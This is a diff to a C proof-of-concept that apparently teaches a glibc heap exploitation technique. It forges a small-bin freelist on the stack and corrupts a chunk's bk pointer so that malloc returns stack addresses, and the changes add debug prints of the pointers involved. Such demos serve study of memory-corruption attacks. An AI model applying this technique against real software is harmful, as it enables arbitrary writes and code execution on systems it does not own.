@@ -26,6 +26,7 @@ int main() {
     // with the exception of fake_freelist[6]->bk = NULL
     for(i = 0; i < 6; i++) {
         fake_freelist[i][3] = fake_freelist[i+1];
+        printf("L[%d]: %p -> %p\n", i, &fake_freelist[i], fake_freelist[i + 1]);
     }
     fake_freelist[6][3] = NULL;
 
@@ -64,6 +65,7 @@ int main() {
     // This is the tricky part of this attack.
     // We need to have a way to overwrite target_chunk->bk with the address of fake1
     target_chunk[3] = (unsigned long long)fake1;
+    printf("XX %p\n", fake1);
     // At this point, the small bin should be as follows (-> goes in the bk direction):
     // target -> fake1 -> fake2 -> [fake_freelist (1->...->6)]
 
@@ -73,15 +75,17 @@ int main() {
     }
 
     // Allocating an additional chunk that should return the address of target
-    printf("%p\n", malloc(0x100));
+    printf("%p,%p::: %p\n", target_chunk[2], target_chunk[3], malloc(0x100));
+    printf("###%p %p\n", target_chunk, fake2);
 
     // The next mallocs will now return an address on the stack
 
     for(i = 0; i < 7; i++) {
         target = malloc(0x100);
     }
-    printf("target: %p\n", target);
-    printf("fake1: %p\n", &fake1[2]);
+    // target = malloc(0x100);
+    printf("target: %p\n", ((char*)target - 0x10));
+    printf("fake1: %p %p\n", &fake1[2], malloc(0x100));
     printf("after this long and unrelated sequence of malloc()'s and free()'s,");
     printf("I can trust you to write into this buffer, which resides in the heap\n");
     read(0, target, 0x100);
